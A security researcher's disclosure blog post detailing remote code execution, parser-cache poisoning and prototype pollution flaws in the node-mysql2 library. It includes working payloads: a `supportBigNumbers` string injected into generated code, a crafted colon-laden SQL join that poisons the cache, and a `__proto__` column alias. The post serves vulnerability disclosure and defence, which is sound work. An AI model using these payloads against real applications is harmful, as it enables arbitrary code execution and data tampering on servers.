---
title: 'Unveiling Vulnerabilities in node-mysql2 : Exploiting Remote Code Execution, Cache Poisoning, and Prototype Pollution'
date: 2024-01-12T00:00:00-03:00
tags: [security+]
---

> The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.

# Introduction
The node-mysql2 library is one of the most popular libraries for connecting to a database in JavaScript, with over 2 million installations per week.

At the end of last year, I encountered an automation system that utilized the node-mysql2 library to connect to user databases and execute queries controlled by them.
In this article, I want to discuss the issues it causes and provide you with their solutions.

# Basics
In the application I was researching, the user could establish a connection to their database and execute queries with it:

```
// Simplified example
const mysql = require('mysql2');
...
const connection = mysql.createConnection({
    host: userdata.host,
    user: userdata.user,
    database: userdata.db,
    password: userdata.password,
});
...
connection.query(userdata.query,reponseFunction)
);

```

Obviously, in this case, I cannot talk about standard SQL-related attack vectors since the connection belongs to us. Therefore, I should consider issues related to affecting other users data or server performance.

# RCE
As you might guess, I was able to find a way to execute arbitary code in such a configuration, but how is this possible?

First, let's understand how the library works. In most cases, the first argument passed to the connection.query function is a string containing the query:

```
connection.query("SELECT 1;",reponseFunction)

```

But actually, the first argument can also be an object, where in addition to the query itself, I can pass parameters for its processing:

```
connection.query({sql:"SELECT 1;", ... },reponseFunction)

```

After that, the passed configuration parameters will be used by the response parsing [function](https://github.com/sidorares/node-mysql2/blob/1609b5393516d72a4ae47196837317fbe75e0c13/lib/parsers/text_parser.js#L14C10-L14C21).
(It's also worth noting that these same parameters can be passed directly into the database connection, which can be useful if the query argument is filtered.)

If you look closely, you will notice that this function involves code generation. MySQL2 generates a parsing function for each query, which is then cached for optimization purposes. This is important for understanding this article.

I noticed that in most cases, it successfully sanitizes the data that enters the generated code. However, there is also a line:

```
return `packet.parseLengthCodedInt(${supportBigNumbers})`;

```

The parameter supportBigNumbers is a number in a legitimate case, so it is not sanitized. However, are there any checks for this?

A quick look at the code revealed that such checks are absent. This piece of code will be executed if the executed query returns a BIGNUMBER, so to achieve RCE, it is sufficient to pass the following object as the first argument:

```
{sql:`SELECT INDEX_LENGTH FROM information_schema.tables LIMIT 1`, supportBigNumbers:"console.log(1337)"}

```

As a result, you will see 1337 in the console after executing this database query.

**!!! It's also important to understand that an object with a global prototype is used as a map. Therefore, you can use this as Prototype Pollution to achieve RCE. If the targeted application uses mysql2 and you achieve PP, you can also gain RCE.**

# Cache Poisoning
The next vulnerability becomes accessible even in stricter application configurations. Its exploitation is possible even if the first argument query is checked to ensure it is a string.
As I mentioned earlier, the library utilizes caching of generated response functions. Let's take a look at how it was [implemented](https://github.com/sidorares/node-mysql2/blob/fd3d117da82cc5c5fa5a3701d7b33ca77691bc61/lib/parsers/parser_cache.js#L9):

```
function keyFromFields(type, fields, options, config) {
  let res =
    `${type}` +
    `/${typeof options.nestTables}` +
    `/${options.nestTables}` +
    `/${options.rowsAsArray}` +
    `/${options.supportBigNumbers || config.supportBigNumbers}` +
    `/${options.bigNumberStrings || config.bigNumberStrings}` +
    `/${typeof options.typeCast}` +
    `/${options.timezone || config.timezone}` +
    `/${options.decimalNumbers}` +
    `/${options.dateStrings}`;
  for (let i = 0; i < fields.length; ++i) {
    const field = fields[i];
    res += `/${field.name}:${field.columnType}:${field.length}:${field.schema}:${field.table}:${field.flags}:${field.characterSet}`;
  }
  return res;
}

```

As you can see, keys are inserted into the string, and ":" is used as a delimiter. This is a poor implementation because the values passed into the key can also contain ":". By exploiting this characteristic, one can manipulate the hashed function:

```
connection.query(
'SELECT information_schema.tables.TABLE_NAME,`tables:160:63/DATA_LENGTH:8:undefined::tables`.TABLE_ROWS FROM information_schema.tables INNER JOIN information_schema.tables AS `tables:160:63/DATA_LENGTH:8:undefined::tables` ON `tables:160:63/DATA_LENGTH:8:undefined::tables`.TABLE_ROWS!=information_schema.tables.TABLE_ROWS LIMIT 1;',
    function(err, results, fields) {
    }
  );
  // Send another request and spwan new connection
  connection1.query(
    `SELECT TABLE_NAME, TABLE_ROWS, DATA_LENGTH FROM information_schema.tables LIMIT 1;`,
    function(err, results, fields) {
      console.log(results);
      console.log(fields);
    }
  );

```
You will see output:

```
[ { TABLE_NAME: 'ADMINISTRABLE_ROLE_AUTHORIZATIONS', TABLE_ROWS: 0 } ]
[
  `TABLE_NAME` VARCHAR(64) NOT NULL,
  `TABLE_ROWS` BIGINT(21) UNSIGNED,
  `DATA_LENGTH` BIGINT(21) UNSIGNED
]

```

As evident, the fields of the second request include DATA_LENGTH, which, however, is absent in the results. This discrepancy arises because the first request stores in the cache a key `text/undefined/undefined/false/false/false/boolean/local/false/false/TABLE_NAME:253:undefined:information_schema:tables:20609:224/TABLE_ROWS:8:undefined::tables:160:63/DATA_LENGTH:8:undefined::tables:160:63` with an incorrect packet parser.

This can be used to disrupt the logic of the application, sending data types that are not expected.

Fixed in latest release.

# Prototype Poisoning / Pollution
Returning to the process of generating the function that parses the returned response, it can be observed that an object with a global prototype is used as the user-supplied [value](https://github.com/sidorares/node-mysql2/blob/fd3d117da82cc5c5fa5a3701d7b33ca77691bc61/lib/parsers/text_parser.js#L134):
```
parserFn("const result = {};");

```

Therefore, if you pass the following query:

```
SELECT CAST('{"toString": {"toString":true}, "tags": {"a": 1, "b": null}}' as JSON) AS __proto__;

```

You will notice that the response prototype has changed

```
Object.getPrototypeOf(results[0])
> { tags: { a: 1, b: null }, toString: { toString: true } }

```
his only controls a specific prototype, not the global one. However, if I have the ability to control the configuration, I can simply pass `nestTables: true`:

```
} else if (options.nestTables === true) {
    lvalue = `result[${helpers.srcEscape(fields[i].table)}][${fieldName}]`;
}

```
As many might understand, this will give us full prototype pollution.
   
# Conclusion 
I informed the vendor about these issues 90 days ago and my intentions to publish this material on March 26th. Unfortunately, the vendor did not provide the necessary cooperation, ignoring my emails for months, so this material was released without the final fixes.

Today, a [fix](https://github.com/sidorares/node-mysql2/releases/tag/v3.9.3) was released that addresses the cache manipulation issue. However, the remaining problems remain relevant in the latest version.

If you are using the library in the described scenarios, I strongly advise you to limit the connection parameters and the parameters passed in the query.